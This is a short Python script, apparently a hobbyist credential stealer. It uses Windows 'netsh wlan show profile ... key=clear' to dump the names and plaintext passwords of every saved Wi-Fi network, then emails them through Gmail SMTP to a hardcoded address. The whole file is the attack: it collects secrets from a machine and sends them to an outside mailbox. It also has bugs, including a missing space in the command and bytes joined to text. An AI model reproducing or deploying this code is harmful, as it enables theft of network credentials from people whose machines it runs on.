import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = "netsh wlan show profile"
# command = "netstat -i -n"

networks =  subprocess.check_output(command,shell=True)
# network_regex = re.compile("(?:lo0\s*)(\d+)")
network_regex = re.compile("(?:Profile\s*:\s)(.*)")
# By adding ?: at the beginning the first group is ignored
network_names_list = network_regex.findall(str(networks))

result=""

for network_name in network_names_list:
    command = "netsh wlan show profile" + network_name + " key=clear" # key = clear makes the password visible
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("mattolisaverio@gmail.com", "pass", result)

